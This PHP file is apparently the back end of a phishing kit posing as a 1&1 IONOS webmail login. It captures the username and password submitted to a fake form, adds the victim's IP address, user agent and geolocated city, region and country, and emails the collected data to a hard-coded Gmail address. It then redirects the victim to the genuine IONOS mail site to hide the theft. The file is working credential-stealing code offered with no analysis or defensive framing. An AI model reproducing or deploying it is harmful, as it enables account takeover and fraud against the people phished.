<?php 
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$agent=$_SERVER['HTTP_USER_AGENT'];
$email= "andrewho231@gmail.com";
$ip = getenv("REMOTE_ADDR");
$message  = "==================+[ Personal Info - IONOS #2]+==================\n";
$message .= "Email Address : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "============= [ Ip & Hostname Info ] =============\n";
$message .= "Client IP : ".$ip."\n";
$message .= "User-Agent : ".$agent."\n";
$message .= "--------------------------------------------\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "=============+ [IONOS] +=============\n";
$subject = "1&1 IONOS - ".$ip;


mail($email,$subject,$message);

header('Location: https://mail.ionos.com/');
?>



